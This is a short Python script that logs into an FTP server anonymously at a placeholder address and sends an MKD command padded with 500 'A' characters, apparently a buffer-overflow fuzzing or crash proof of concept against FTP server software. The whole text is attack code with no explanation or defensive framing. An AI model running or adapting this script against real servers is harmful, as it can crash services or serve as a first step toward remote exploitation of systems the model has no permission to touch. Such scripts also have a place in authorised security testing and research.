import socket
import sys

buff = "A"*500

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect = s.connect(('<ip address>',21))

s.recv(1024)
s.send('USER anonymous\r\n')
s.recv(1024)
s.send('PASS anonymous\r\n')
s.recv(1024)
s.send('MKD '+buff+'\r\n')
s.recv(1024)
s.send('QUIT\r\n')
s.close
